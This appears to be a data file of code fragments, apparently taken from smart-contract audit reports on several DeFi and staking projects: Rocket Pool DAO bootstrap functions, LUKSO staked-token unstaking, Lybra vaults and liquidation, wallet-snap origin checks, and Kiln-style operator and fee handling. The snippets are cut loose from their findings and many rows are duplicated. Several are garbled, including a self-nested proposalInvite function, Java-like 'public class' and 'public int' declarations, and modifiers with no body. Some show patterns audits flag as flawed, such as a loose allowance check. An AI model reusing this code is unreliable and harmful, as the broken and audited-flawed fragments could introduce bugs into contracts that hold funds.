"```\nfunction bootstrapMember(string memory _id, string memory _url, address _nodeAddress) override external onlyGuardian onlyBootstrapMode onlyRegisteredNode(_nodeAddress) onlyLatestContract(""rocketDAONodeTrusted"", address(this)) {\n    RocketDAONodeTrustedProposalsInterface(getContractAddress(""rocketDAONodeTrustedProposals"")).proposalInvite(_id, _url, _nodeAddress);\n}\n\nfunction bootstrapSettingUint(string memory _settingContractName, string memory _settingPath, uint256 _value) override external onlyGuardian onlyBootstrapMode onlyLatestContract(""rocketDAONodeTrusted"", address(this)) {\n    RocketDAONodeTrustedProposalsInterface(getContractAddress(""rocketDAONodeTrustedProposals"")).proposalSettingUint(_settingContractName, _settingPath, _value);\n}\n\nfunction bootstrapSettingBool(string memory _settingContractName, string memory _settingPath, bool _value) override external onlyGuardian onlyBootstrapMode onlyLatestContract(""rocketDAONodeTrusted"", address(this)) {\n    RocketDAONodeTrustedProposalsInterface(getContractAddress(""rocketDAONodeTrustedProposals"")).proposalSettingBool(_settingContractName, _settingPath, _value);\n}\n```\n```\nfunction bootstrapSettingMulti(\n    string[] memory _settingContractNames,\n    string[] memory _settingPaths,\n    SettingType[] memory _types,\n    bytes[] memory _values\n) override external onlyGuardian onlyBootstrapMode onlyLatestContract(""rocketDAOProtocol"", address(this)) {\n    RocketDAOProtocolProposalsInterface(getContractAddress(""rocketDAOProtocolProposals"")).proposalSettingMulti(_settingContractNames, _settingPaths, _types, _values);\n}\n\nfunction bootstrapSettingUint(\n    string memory _settingContractName,\n    string memory _settingPath,\n    uint256 _value\n) override external onlyGuardian onlyBootstrapMode onlyLatestContract(""rocketDAOProtocol"", address(this)) {\n    RocketDAOProtocolProposalsInterface(getContractAddress(""rocketDAOProtocolProposals"")).proposalSettingUint(_settingContractName, _settingPath, _value);\n}\n```\n```\nfunction bootstrapTreasuryNewContract(\n    string memory _contractName,\n    address _recipientAddress,\n    uint256 _amountPerPeriod,\n    uint256 _periodLength,\n    uint256 _startTime,\n    uint256 _numPeriods\n) override external onlyGuardian onlyBootstrapMode onlyLatestContract(""rocketDAOProtocol"", address(this)) {\n    RocketDAOProtocolProposalsInterface(getContractAddress(""rocketDAOProtocolProposals"")).proposalTreasuryNewContract(\n        _contractName,\n        _recipientAddress,\n        _amountPerPeriod,\n        _periodLength,\n        _startTime,\n        _numPeriods\n    );\n}\n```\n```\nfunction bootstrapDisable(bool _confirmDisableBootstrapMode) override external onlyGuardian onlyBootstrapMode onlyLatestContract(""rocketDAOProtocol"", address(this)) {\n    require(_confirmDisableBootstrapMode == true, ""You must confirm disabling bootstrap mode, it can only be done once!"");\n    setBool(keccak256(abi.encodePacked(daoNameSpace, ""bootstrapmode.disabled"")), true);\n}\n```\n```\nfunction bootstrapSpendTreasury(\n    string memory _invoiceID,\n    address _recipientAddress,\n    uint256 _amount\n) override external onlyGuardian onlyBootstrapMode onlyLatestContract(""rocketDAOProtocol"", address(this)) {\n    RocketDAOProtocolProposalsInterface(getContractAddress(""rocketDAOProtocolProposals"")).proposalTreasuryOneTimeSpend(_invoiceID, _recipientAddress, _amount);\n}\n```\n```\nfunction setDelegate(address _newDelegate) external override onlyRegisteredNode(msg.sender) {\n```\n```\nfunction proposalSettingUint(\n    string memory _settingNameSpace,\n    string memory _settingPath,\n    uint256 _value\n) override public onlyExecutingContracts() onlyValidSetting(_settingNameSpace, _settingPath) {\n    bytes32 namespace = keccak256(abi.encodePacked(protocolDaoSettingNamespace, _settingNameSpace));\n```\n```\nfunction proposalSettingBool(\n    string memory _settingNameSpace,\n    string memory _settingPath,\n    bool _value\n) override public onlyExecutingContracts() onlyValidSetting(_settingNameSpace, _settingPath) {\n    bytes32 namespace = keccak256(abi.encodePacked(protocolDaoSettingNamespace, _settingNameSpace));\n```\n```\nfunction proposalSettingAddress(\n    string memory _settingNameSpace,\n    string memory _settingPath,\n    address _value\n) override public onlyExecutingContracts() onlyValidSetting(_settingNameSpace, _settingPath) {\n    bytes32 namespace = keccak256(abi.encodePacked(protocolDaoSettingNamespace, _settingNameSpace));\n```\n```\nfunction proposalInvite(string calldata _id, address _memberAddress) override public onlyLatestContract(""rocketDAOProtocolProposals"", msg.sender) {\n    override public onlyLatestContract(""rocketDAOProtocolProposals"", msg.sender) {\n        proposalInvite(string calldata _id, address _memberAddress) {\n            // Their proposal executed, record the block\n```"
"```\nfunction _propose(\n    string memory _proposalMessage,\n    uint256 _blockNumber,\n    uint256 _totalVotingPower,\n    bytes calldata _payload\n) internal returns (uint256) {\n```"
"```\nRocketDAOProtocolSettingsNodeInterface rocketDAOProtocolSettingsNode = \n    RocketDAOProtocolSettingsNodeInterface(getContractAddress(""rocketDAOProtocolSettingsNode""));\n```\nkey = keccak256(abi.encodePacked(""rpl.staked.node.amount"", _nodeAddress));\nuint256 rplStake = uint256(rocketNetworkSnapshots.lookupRecent(key, uint32(_block), 5));\n\nreturn calculateVotingPower(rplStake, ethMatched, ethProvided, rplPrice);\n```\n```\nuint256 maximumStake = providedETH * maximumStakePercent / rplPrice;\n```"
"```\n/**\n@notice Get the votes against count of this proposal\n@param _proposalID The ID of the proposal to query\n*/\n```\nfunction getReceiptDirection(uint256 _proposalID, address _nodeAddress) override public view returns (VoteDirection) {\n    return VoteDirection(getUint(keccak256(abi.encodePacked(\n        daoProposalNameSpace,\n        ""receipt.direction"",\n        _proposalID,\n        _nodeAddress\n    ))));\n}\n```\n```\n/// @notice Used by a verifier to challenge a specific index of a proposal's voting power tree\n/// @param _proposalID The ID of the proposal being challenged\n/// @param _index The global index of the node being challenged\n```"
"```\nsetUint(\n    keccak256(\n        abi.encodePacked(\n            settingNameSpace,\n            ""rewards.claims"",\n            ""periods""\n        )\n    ),\n    _periods\n)"
"```\ncontract Rewards is\n    IRewards,\n    OwnablePausableUpgradeable,\n    ReentrancyGuardUpgradeable {\n```\n```\ncontract Pool is\n    IPool,\n    OwnablePausableUpgradeable,\n    ReentrancyGuardUpgradeable {\n```\n```\ncontract StakedLyxToken is\n    OwnablePausableUpgradeable,\n    LSP4DigitalAssetMetadataInitAbstract,\n    IStakedLyxToken,\n    ReentrancyGuardUpgradeable {\n```"
"```\nfunction receiveFees() external payable override {\n}\n```\n```\nfunction receiveWithoutActivation() external payable override {\n    require(msg.sender == address(stakedLyxToken) || hasRole(DEFAULT_ADMIN_ROLE, msg.sender), ""Pool: access denied"");\n}\n```"
```\nif (unstakeAmount > totalPendingUnstake) {\n    pool.receiveWithoutActivation{value: unstakeAmount - totalPendingUnstake}();\n    unstakeAmount = totalPendingUnstake;\n}\n\ntotalPendingUnstake -= unstakeAmount;\ntotalUnstaked += unstakeAmount;\n\nuint256 amountToFill = unstakeAmount;\n\nfor (uint256 i = unstakeRequestCurrentIndex; i <= unstakeRequestCount; i++) {\n    UnstakeRequest storage request = _unstakeRequests[i];\n    if (amountToFill > (request.amount - request.amountFilled)) {\n        amountToFill -= (request.amount - request.amountFilled);\n        continue;\n    } else {\n        if (amountToFill == (request.amount - request.amountFilled) && i < unstakeRequestCount) {\n            unstakeRequestCurrentIndex = i + 1;\n        } else {\n            request.amountFilled += uint128(amountToFill);\n            unstakeRequestCurrentIndex = i;\n        }\n        break;\n    }\n}\n```
"```\ncontract Rewards is\n    IRewards,\n    OwnablePausableUpgradeable,\n    ReentrancyGuardUpgradeable {\n```\n```\ncontract Pool is\n    IPool,\n    OwnablePausableUpgradeable,\n    ReentrancyGuardUpgradeable {\n```\n```\ncontract StakedLyxToken is\n    OwnablePausableUpgradeable,\n    LSP4DigitalAssetMetadataInitAbstract,\n    IStakedLyxToken,\n    ReentrancyGuardUpgradeable {\n```"
```\nif (unstakeAmount > totalPendingUnstake) {\n    pool.receiveWithoutActivation{value: unstakeAmount - totalPendingUnstake}();\n    unstakeAmount = totalPendingUnstake;\n}\n\ntotalPendingUnstake -= unstakeAmount;\ntotalUnstaked += unstakeAmount;\n\nuint256 amountToFill = unstakeAmount;\n\nfor (uint256 i = unstakeRequestCurrentIndex; i <= unstakeRequestCount; i++) {\n    UnstakeRequest storage request = _unstakeRequests[i];\n    if (amountToFill > (request.amount - request.amountFilled)) {\n        amountToFill -= (request.amount - request.amountFilled);\n        continue;\n    } else {\n        if (amountToFill == (request.amount - request.amountFilled) && i < unstakeRequestCount) {\n            unstakeRequestCurrentIndex = i + 1;\n        } else {\n            request.amountFilled += uint128(amountToFill);\n            unstakeRequestCurrentIndex = i;\n        }\n        break;\n    }\n}\n```
"```\ncontract LybraWstETHVault is LybraPeUSDVaultBase {\n    address immutable lido;\n\n    constructor(address _lido, address _asset, address _oracle, address _config)\n        LybraPeUSDVaultBase(_asset, _oracle, _config)\n    {\n        lido = Ilido(_lido);\n    }\n\n    function depositEtherToMint(uint256 mintAmount) external payable override {\n        require(msg.value >= 1 ether, ""DNL"");\n        uint256 sharesAmount = lido.submit{value: msg.value}(address(configurator));\n        require(sharesAmount!= 0, ""ZERO_DEPOSIT"");\n        lido.approve(address(collateralAsset), msg.value);\n        uint256 wstETHAmount = IWstETH(address(collateralAsset)).wrap(msg.value);\n        depositedAsset[msg.sender] += wstETHAmount;\n        if (mintAmount > 0) {\n            _mintPeUSD(msg.sender, msg.sender, mintAmount, getAssetPrice());\n        }\n        emit DepositEther(msg.sender, address(collateralAsset), msg.value, wstETHAmount, block.timestamp);\n    }\n```\n```\ncontract LybraWBETHVault is LybraPeUSDVaultBase {\n    // WBETH = 0xa2e3356610840701bdf5611a53974510ae27e2e1\n\n    constructor(address _asset, address _oracle, address _config)\n        LybraPeUSDVaultBase(_asset, _oracle, _config)\n    {}\n\n    function depositEtherToMint(uint256 mintAmount) external payable override {\n        require(msg.value >= 1 ether, ""DNL"");\n        uint256 preBalance = collateralAsset.balanceOf(address(this));\n        IWBETH(address(collateralAsset)).deposit{value: msg.value}(address(configurator));\n        uint256 balance = collateralAsset.balanceOf(address(this));\n        depositedAsset[msg.sender] += balance - preBalance;\n\n        if (mintAmount > 0) {\n            _mintPeUSD(msg.sender, msg.sender, mintAmount, getAssetPrice());\n        }\n\n        emit DepositEther(msg.sender, address(collateralAsset), msg.value, balance - preBalance, block.timestamp);\n    }\n```\n```\nconstructor(address _rocketStorageAddress, address _rETH, address _oracle, address _config)\n    LybraPeUSDVaultBase(_rETH, _oracle, _config) {\n    rocketStorage = IRocketStorageInterface(_rocketStorageAddress);\n}\n\nfunction depositEtherToMint(uint256 mintAmount) external payable override {\n    require(msg.value >= 1 ether, ""DNL"");\n    uint256 preBalance = collateralAsset.balanceOf(address(this));\n    IRocketDepositPool(rocketStorage.getAddress(keccak256(abi.encodePacked(""contract.address"", ""rocketDepositPool"")))).deposit{value: msg.value}();\n    uint256 balance = collateralAsset.balanceOf(address(this));\n    depositedAsset[msg.sender] += balance - preBalance;\n\n    if (mintAmount > 0) {\n        _mintPeUSD(msg.sender, msg.sender, mintAmount, getAssetPrice());\n    }\n\n    emit DepositEther(msg.sender, address(collateralAsset), msg.value, balance - preBalance, block.timestamp);\n}\n```"
"```\nfunction checkRole(bytes32 role, address _sender) public view returns(bool) {\n    return hasRole(role, _sender) || hasRole(DAO, _sender);\n}\n\nfunction checkOnlyRole(bytes32 role, address _sender) public view returns(bool) {\n    return hasRole(role, _sender);\n}\n```\n```\nconstructor(uint256 minDelay, address[] memory proposers, address[] memory executors, address admin) public TimelockController(minDelay, proposers, executors, admin) {\n    _setRoleAdmin(DAO, GOV);\n    _setRoleAdmin(TIMELOCK, GOV);\n    _setRoleAdmin(ADMIN, GOV);\n    _grantRole(DAO, address(this));\n    _grantRole(DAO, msg.sender);\n    _grantRole(GOV, msg.sender);\n}\n```"
"```\nfunction convertToPeUSD(address user, uint256 eusdAmount) public {\n    require(_msgSender() == user || _msgSender() == address(this), ""MDM"");\n    require(eusdAmount!= 0, ""ZA"");\n    require(EUSD.balanceOf(address(this)) + eusdAmount <= configurator.getEUSDMaxLocked(), ""ESL"");\n```"
"```\nfunction liquidation(\n    address provider,\n    address onBehalfOf,\n    uint256 assetAmount\n) external virtual {\n    uint256 assetPrice = getAssetPrice();\n    uint256 onBehalfOfCollateralRatio = (\n        depositedAsset[onBehalfOf] * assetPrice * 100\n    ) / borrowed[onBehalfOf];\n    require(onBehalfOfCollateralRatio < badCollateralRatio, ""Borrowers collateral ratio should below badCollateralRatio"");\n\n    require(assetAmount * 2 <= depositedAsset[onBehalfOf], ""a max of 50% collateral can be liquidated"");\n    require(EUSD.allowance(provider, address(this))!= 0, ""provider should authorize to provide liquidation EUSD"");\n\n    uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;\n\n    _repay(provider, onBehalfOf, eusdAmount);\n    uint256 reducedAsset = assetAmount * 11 / 10;\n    totalDepositedAsset -= reducedAsset;\n    depositedAsset[onBehalfOf] -= reducedAsset;\n\n    uint256 reward2keeper;\n    if (provider == msg.sender) {\n        collateralAsset.safeTransfer(msg.sender, reducedAsset);\n    } else {\n        reward2keeper = (\n            reducedAsset * configurator.vaultKeeperRatio(address(this))\n        ) / 110;\n        collateralAsset.safeTransfer(provider, reducedAsset - reward2keeper);\n        collateralAsset.safeTransfer(msg.sender, reward2keeper);\n    }\n\n    emit LiquidationRecord(\n        provider,\n        msg.sender,\n        onBehalfOf,\n        eusdAmount,\n        reducedAsset,\n        reward2keeper,\n        false,\n        block.timestamp\n    );\n}\n```\n```\nrequire(\n    EUSD.allowance(provider, address(this))!= 0,\n    ""provider should authorize to provide liquidation EUSD""\n);\n```\nrequire(\n    EUSD.allowance(provider, address(this)) >= eusdAmount,\n    ""provider should authorize to provide liquidation EUSD""\n);\n```\nif (provider == msg.sender) {\n    collateralAsset.safeTransfer(msg.sender, reducedAsset);\n} else {\n    reward2keeper = (reducedAsset * configurator.vaultKeeperRatio(address(this))) / 110;\n    collateralAsset.safeTransfer(provider, reducedAsset - reward2keeper);\n    collateralAsset.safeTransfer(msg.sender, reward2keeper);\n}\n```"
```\npragma solidity ^0.8;\n```
"```\ncontract esLBRBoost is Ownable {\n    esLBRLockSetting[] public esLBRLockSettings;\n    mapping(address => LockStatus) public userLockStatus;\n    IMiningIncentives public miningIncentives;\n\n    struct esLBRLockSetting {\n        uint256 duration;\n        uint256 miningBoost;\n    }\n\n    struct LockStatus {\n        uint256 lockAmount;\n        uint256 unlockTime;\n        uint256 duration;\n        uint256 miningBoost;\n    }\n\n    constructor(address _miningIncentives) {\n```\n```\nfunction unlockPrematurely() external {\n    require(block.timestamp + exitCycle - 3 days > time2fullRedemption[msg.sender], ""ENW"");\n    uint256 burnAmount = getReservedLBRForVesting(msg.sender) - getPreUnlockableAmount(msg.sender);\n    uint256 amount = getPreUnlockableAmount(msg.sender) + getClaimAbleLBR(msg.sender);\n    if (amount > 0) {\n        LBR.mint(msg.sender, amount);\n    }\n    unstakeRatio[msg.sender] = 0;\n    time2fullRedemption[msg.sender] = 0;\n    grabableAmount += burnAmount;\n}\n```\n```\nfunction setToken(address _lbr, address _eslbr) external onlyOwner {\n    LBR = _lbr;\n    esLBR = _eslbr;\n}\n\nfunction setLBROracle(address _lbrOracle) external onlyOwner {\n    lbrPriceFeed = AggregatorV3Interface(_lbrOracle);\n}\n\nfunction setPools(address[] memory _vaults) external onlyOwner {\n    require(_vaults.length <= 10, ""EL"");\n    for (uint i = 0; i < _vaults.length; i++) {\n        require(configurator.mintVault(_vaults[i]), ""NOT_VAULT"");\n    }\n    vaults = _vaults;\n}\n```\n```\nfunction setRewardsDuration(uint256 _duration) external onlyOwner {\n    require(finishAt < block.timestamp, ""reward duration not finished"");\n    duration = _duration;\n}\n\nfunction setBoost(address _boost) external onlyOwner {\n    esLBRBoost = IesLBRBoost(_boost);\n}\n```\n```\nif (useLBR) {\n    IesLBR(miningIncentives.LBR()).burn(msg.sender, lbrAmount);\n    IesLBR(miningIncentives.esLBR()).mint(msg.sender, lbrAmount);\n}\n```"
```\npublic class IPeUSD {\n    public EUSD;\n}\n```\n```\nif (address(EUSD) == address(0)) {\n    EUSD = IPeUSD(_eusd);\n}\n```\n```\npublic int LBR;\n```\n```\nLBR = IesLBR(_lbr);\n```
"```\nmodule.exports.onRpcRequest = async ({ origin, request }) => {\n  if (\n   !origin ||\n    (\n     !origin.match(/^https?:\/\/localhost:[0-9]{1,4}$/) &&\n     !origin.match(/^https?:\/\/(?:\S+\.)?solflare\.com$/) &&\n     !origin.match(/^https?:\/\/(?:\S+\.)?solflare\.dev$/)\n    )\n  ) {\n    throw new Error('Invalid origin');\n  }\n```\n```\nmodule.exports.onRpcRequest = async ({ origin, request }) => {\n  if (\n   !origin ||\n    (\n     !origin.match(/^https?:\/\/localhost:[0-9]{1,4}$/) &&\n     !origin.match(/^https?:\/\/(?:\S+\.)?risewallet\.dev$/)\n    )\n  ) {\n    throw new Error('Invalid origin');\n  }\n```\n```\nmodule.exports.onRpcRequest = async ({ origin, request }) => {\n  if (\n   !origin ||\n    (\n     !origin.match(/^https?:\/\/localhost:[0-9]{1,4}$/) &&\n     !origin.match(/^https?:\/\/(?:\S+\.)?elliwallet\.dev$/)\n    )\n  ) {\n    throw new Error('Invalid origin');\n  }\n```"
"```\nmodule.exports.onRpcRequest = async ({ origin, request }) => {\n  if (\n   !origin ||\n    (\n     !origin.match(/^https?:\/\/localhost:[0-9]{1,4}$/) &&\n     !origin.match(/^https?:\/\/(?:\S+\.)?solflare\.com$/) &&\n     !origin.match(/^https?:\/\/(?:\S+\.)?solflare\.dev$/)\n    )\n  ) {\n    throw new Error('Invalid origin');\n  }\n```\n```\nmodule.exports.onRpcRequest = async ({ origin, request }) => {\n  if (\n   !origin ||\n    (\n     !origin.match(/^https?:\/\/localhost:[0-9]{1,4}$/) &&\n     !origin.match(/^https?:\/\/(?:\S+\.)?risewallet\.dev$/)\n    )\n  ) {\n    throw new Error('Invalid origin');\n  }\n```\n```\nmodule.exports.onRpcRequest = async ({ origin, request }) => {\n  if (\n   !origin ||\n    (\n     !origin.match(/^https?:\/\/localhost:[0-9]{1,4}$/) &&\n     !origin.match(/^https?:\/\/(?:\S+\.)?elliwallet\.dev$/)\n    )\n  ) {\n    throw new Error('Invalid origin');\n  }\n```"
"```\nfunction __DramAccessControl_init_unchained(\n    address admin\n) internal onlyInitializing {\n    _grantRole(ADMIN_ROLE, admin);\n    _grantRole(ROLE_MANAGER_ROLE, admin);\n    _grantRole(SUPPLY_MANAGER_ROLE, admin);\n}\n```"
"```\nfunction setMintCap(\n    address operator,\n    uint256 amount\n) external onlyRoleOrAdmin(ROLE_MANAGER_ROLE) {\n    _setMintCap(operator, amount);\n}\n```"
"```\nfunction setOperatorAddresses(\n    uint256 _operatorIndex,\n    address _operatorAddress,\n    address _feeRecipientAddress\n) external onlyActiveOperatorFeeRecipient(_operatorIndex) {\n    _checkAddress(_operatorAddress);\n    _checkAddress(_feeRecipientAddress);\n    StakingContractStorageLib.OperatorsSlot storage operators = StakingContractStorageLib.getOperators();\n\n    operators.value[_operatorIndex].operator = _operatorAddress;\n    operators.value[_operatorIndex].feeRecipient = _feeRecipientAddress;\n    emit ChangedOperatorAddresses(_operatorIndex, _operatorAddress, _feeRecipientAddress);\n}\n```"
```\nif (\n    operators.value[_operatorIndex].limit < _limit &&\n    StakingContractStorageLib.getLastValidatorEdit() > _snapshot\n) {\n    revert LastEditAfterSnapshot();\n}\n```
"```\nfunction addOperator(address _operatorAddress, address _feeRecipientAddress) external onlyAdmin returns (uint256) {\n    StakingContractStorageLib.OperatorsSlot storage operators = StakingContractStorageLib.getOperators();\n    StakingContractStorageLib.OperatorInfo memory newOperator;\n\n    if (operators.value.length == 1) {\n        revert MaximumOperatorCountAlreadyReached();\n    }\n```\n```\nfunction _depositOnOneOperator(uint256 _depositCount, uint256 _totalAvailableValidators) internal {\n    StakingContractStorageLib.setTotalAvailableValidators(_totalAvailableValidators - _depositCount);\n    _depositValidatorsOfOperator(0, _depositCount);\n}\n```"
"```\nfunction addValidators(\n    uint256 _operatorIndex,\n    uint256 _keyCount,\n    bytes calldata _publicKeys,\n    bytes calldata _signatures\n) external onlyActiveOperator(_operatorIndex) {\n    if (_keyCount == 0) {\n        revert InvalidArgument();\n    }\n\n    if (_publicKeys.length % PUBLIC_KEY_LENGTH!= 0 || _publicKeys.length / PUBLIC_KEY_LENGTH!= _keyCount) {\n        revert InvalidPublicKeys();\n    }\n```\n```\nfunction setWithdrawer(bytes calldata _publicKey, address _newWithdrawer) external {\n    if (!StakingContractStorageLib.getWithdrawerCustomizationEnabled()) {\n        revert Forbidden();\n    }\n    _checkAddress(_newWithdrawer);\n    bytes32 pubkeyRoot = _getPubKeyRoot(_publicKey);\n    StakingContractStorageLib.WithdrawersSlot storage withdrawers = StakingContractStorageLib.getWithdrawers();\n\n    if (withdrawers.value[pubkeyRoot]!= msg.sender) {\n        revert Unauthorized();\n    }\n\n    emit ChangedWithdrawer(_publicKey, _newWithdrawer);\n\n    withdrawers.value[pubkeyRoot] = _newWithdrawer;\n}\n```\n```\nfunction _getPubKeyRoot(bytes memory _publicKey) internal pure returns (bytes32) {\n    return sha256(abi.encodePacked(_publicKey, bytes16(0)));\n}\n```\n```\nfunction withdrawELFee(bytes calldata _publicKey) external {\n    _onlyWithdrawerOrAdmin(_publicKey);\n    _deployAndWithdraw(_publicKey, EXECUTION_LAYER_SALT_PREFIX, StakingContractStorageLib.getELDispatcher());\n}\n```"
```\nfunction setOperatorFee(uint256 _operatorFee) external onlyAdmin {\n    if (_operatorFee > StakingContractStorageLib.getOperatorCommissionLimit()) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setOperatorFee(_operatorFee);\n    emit ChangedOperatorFee(_operatorFee);\n}\n```\n```\nfunction setGlobalFee(uint256 _globalFee) external onlyAdmin {\n    if (_globalFee > StakingContractStorageLib.getGlobalCommissionLimit()) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setGlobalFee(_globalFee);\n    emit ChangedGlobalFee(_globalFee);\n}\n```
"```\nfunction initialize_1(\n    address _admin,\n    address _treasury,\n    address _depositContract,\n    address _elDispatcher,\n    address _clDispatcher,\n    address _feeRecipientImplementation,\n    uint256 _globalFee,\n    uint256 _operatorFee,\n    uint256 globalCommissionLimitBPS,\n    uint256 operatorCommissionLimitBPS\n) external init(1) {\n```\n```\nfunction init(address _dispatcher, bytes32 _publicKeyRoot) external {\n    if (initialized) {\n        revert AlreadyInitialized();\n    }\n    initialized = true;\n    dispatcher = IFeeDispatcher(_dispatcher);\n    publicKeyRoot = _publicKeyRoot;\n    stakingContract = msg.sender; // The staking contract always calls init\n}\n```\n```\nfunction init(address _dispatcher, bytes32 _publicKeyRoot) external {\n    if (initialized) {\n        revert AlreadyInitialized();\n    }\n    initialized = true;\n    dispatcher = IFeeDispatcher(_dispatcher);\n    publicKeyRoot = _publicKeyRoot;\n}\n```"
"```\nif (operatorFee > 0) {\n    (status, data) = operator.call({\n        value: operatorFee\n    }(""""));\n    if (status == false) {\n        revert FeeRecipientReceiveError(data);\n    }\n}\n```"
```\nconstructor(uint256 _version) {\n    VERSION_SLOT.setUint256(_version);\n}\n```\n```\nconstructor(uint256 _version) {\n    VERSION_SLOT.setUint256(_version);\n}\n\nfunction initELD(address _stakingContract) external init(1) {\n    STAKING_CONTRACT_ADDRESS_SLOT.setAddress(_stakingContract);\n}\n```
```\nmodifier onlyActiveOperator(uint256 _operatorIndex) {\n    _onlyActiveOperator(_operatorIndex);\n}\n```
"```\nif (_globalFee > BASIS_POINTS) {\n    revert InvalidFee();\n}\nStakingContractStorageLib.setGlobalFee(_globalFee);\n\nif (_operatorFee > BASIS_POINTS) {\n    revert InvalidFee();\n}\nStakingContractStorageLib.setOperatorFee(_operatorFee);\n```\n```\nfunction initialize_2(uint256 globalCommissionLimitBPS, uint256 operatorCommissionLimitBPS) public init(2) {\n    if (globalCommissionLimitBPS > BASIS_POINTS) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setGlobalCommissionLimit(globalCommissionLimitBPS);\n\n    if (operatorCommissionLimitBPS > BASIS_POINTS) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setOperatorCommissionLimit(operatorCommissionLimitBPS);\n}\n```\n```\nfunction setGlobalFee(uint256 _globalFee) external onlyAdmin {\n    if (_globalFee > StakingContractStorageLib.getGlobalCommissionLimit()) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setGlobalFee(_globalFee);\n    emit ChangedGlobalFee(_globalFee);\n}\n```\n```\nfunction setOperatorFee(uint256 _operatorFee) external onlyAdmin {\n    if (_operatorFee > StakingContractStorageLib.getOperatorCommissionLimit()) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setOperatorFee(_operatorFee);\n    emit ChangedOperatorFee(_operatorFee);\n}\n```"
"```\ncontract StakingContract {\n    using StakingContractStorageLib for bytes32;\n}\n```\n```\ninterface IStakingContractFeeDetails {\n    function getWithdrawerFromPublicKeyRoot(bytes32 _publicKeyRoot) external view returns (address);\n\n    function getTreasury() external view returns (address);\n\n    function getOperatorFeeRecipient(bytes32 pubKeyRoot) external view returns (address);\n\n    function getGlobalFee() external view returns (uint256);\n\n    function getOperatorFee() external view returns (uint256);\n\n    function getExitRequestedFromRoot(bytes32 _publicKeyRoot) external view returns (bool);\n\n    function getWithdrawnFromPublicKeyRoot(bytes32 _publicKeyRoot) external view returns (bool);\n\n    function toggleWithdrawnFromPublicKeyRoot(bytes32 _publicKeyRoot) external;\n}\n```\ninterface IFeeRecipient {\n    function init(address _dispatcher, bytes32 _publicKeyRoot) external;\n\n    function withdraw() external;\n}"
"```\nerror Forbidden();\nerror InvalidFee();\nerror Deactivated();\nerror NoOperators();\nerror InvalidCall();\nerror Unauthorized();\nerror DepositFailure();\nerror DepositsStopped();\nerror InvalidArgument();\nerror UnsortedIndexes();\nerror InvalidPublicKeys();\nerror InvalidSignatures();\nerror InvalidWithdrawer();\nerror InvalidZeroAddress();\nerror AlreadyInitialized();\nerror InvalidDepositValue();\nerror NotEnoughValidators();\nerror InvalidValidatorCount();\nerror DuplicateValidatorKey(bytes);\nerror FundedValidatorDeletionAttempt();\nerror OperatorLimitTooHigh(uint256 limit, uint256 keyCount);\nerror MaximumOperatorCountAlreadyReached();\nerror LastEditAfterSnapshot();\nerror PublicKeyNotInContract();\n```\nmodifier init(uint256 _version) {\n    if (_version!= VERSION_SLOT.getUint256() + 1) {\n        revert AlreadyInitialized();\n    }\n}\n```\nmodifier init(uint256 _version) {\n    if (_version!= VERSION_SLOT.getUint256() + 1) {\n        revert AlreadyInitialized();\n    }\n}\n```\nmodifier init(uint256 _version) {\n    if (_version!= StakingContractStorageLib.getVersion() + 1) {\n        revert AlreadyInitialized();\n    }\n}"
"```\nfunction setOperatorAddresses(\n    uint256 _operatorIndex,\n    address _operatorAddress,\n    address _feeRecipientAddress\n) external onlyActiveOperatorFeeRecipient(_operatorIndex) {\n    _checkAddress(_operatorAddress);\n    _checkAddress(_feeRecipientAddress);\n    StakingContractStorageLib.OperatorsSlot storage operators = StakingContractStorageLib.getOperators();\n\n    operators.value[_operatorIndex].operator = _operatorAddress;\n    operators.value[_operatorIndex].feeRecipient = _feeRecipientAddress;\n    emit ChangedOperatorAddresses(_operatorIndex, _operatorAddress, _feeRecipientAddress);\n}\n```"
```\nif (\n    operators.value[_operatorIndex].limit < _limit &&\n    StakingContractStorageLib.getLastValidatorEdit() > _snapshot\n) {\n    revert LastEditAfterSnapshot();\n}\n```
"```\nfunction addOperator(address _operatorAddress, address _feeRecipientAddress) external onlyAdmin returns (uint256) {\n    StakingContractStorageLib.OperatorsSlot storage operators = StakingContractStorageLib.getOperators();\n    StakingContractStorageLib.OperatorInfo memory newOperator;\n\n    if (operators.value.length == 1) {\n        revert MaximumOperatorCountAlreadyReached();\n    }\n```\n```\nfunction _depositOnOneOperator(uint256 _depositCount, uint256 _totalAvailableValidators) internal {\n    StakingContractStorageLib.setTotalAvailableValidators(_totalAvailableValidators - _depositCount);\n    _depositValidatorsOfOperator(0, _depositCount);\n}\n```"
"```\nfunction addValidators(\n    uint256 _operatorIndex,\n    uint256 _keyCount,\n    bytes calldata _publicKeys,\n    bytes calldata _signatures\n) external onlyActiveOperator(_operatorIndex) {\n    if (_keyCount == 0) {\n        revert InvalidArgument();\n    }\n\n    if (_publicKeys.length % PUBLIC_KEY_LENGTH!= 0 || _publicKeys.length / PUBLIC_KEY_LENGTH!= _keyCount) {\n        revert InvalidPublicKeys();\n    }\n```\n```\nfunction setWithdrawer(bytes calldata _publicKey, address _newWithdrawer) external {\n    if (!StakingContractStorageLib.getWithdrawerCustomizationEnabled()) {\n        revert Forbidden();\n    }\n    _checkAddress(_newWithdrawer);\n    bytes32 pubkeyRoot = _getPubKeyRoot(_publicKey);\n    StakingContractStorageLib.WithdrawersSlot storage withdrawers = StakingContractStorageLib.getWithdrawers();\n\n    if (withdrawers.value[pubkeyRoot]!= msg.sender) {\n        revert Unauthorized();\n    }\n\n    emit ChangedWithdrawer(_publicKey, _newWithdrawer);\n\n    withdrawers.value[pubkeyRoot] = _newWithdrawer;\n}\n```\n```\nfunction _getPubKeyRoot(bytes memory _publicKey) internal pure returns (bytes32) {\n    return sha256(abi.encodePacked(_publicKey, bytes16(0)));\n}\n```\n```\nfunction withdrawELFee(bytes calldata _publicKey) external {\n    _onlyWithdrawerOrAdmin(_publicKey);\n    _deployAndWithdraw(_publicKey, EXECUTION_LAYER_SALT_PREFIX, StakingContractStorageLib.getELDispatcher());\n}\n```"
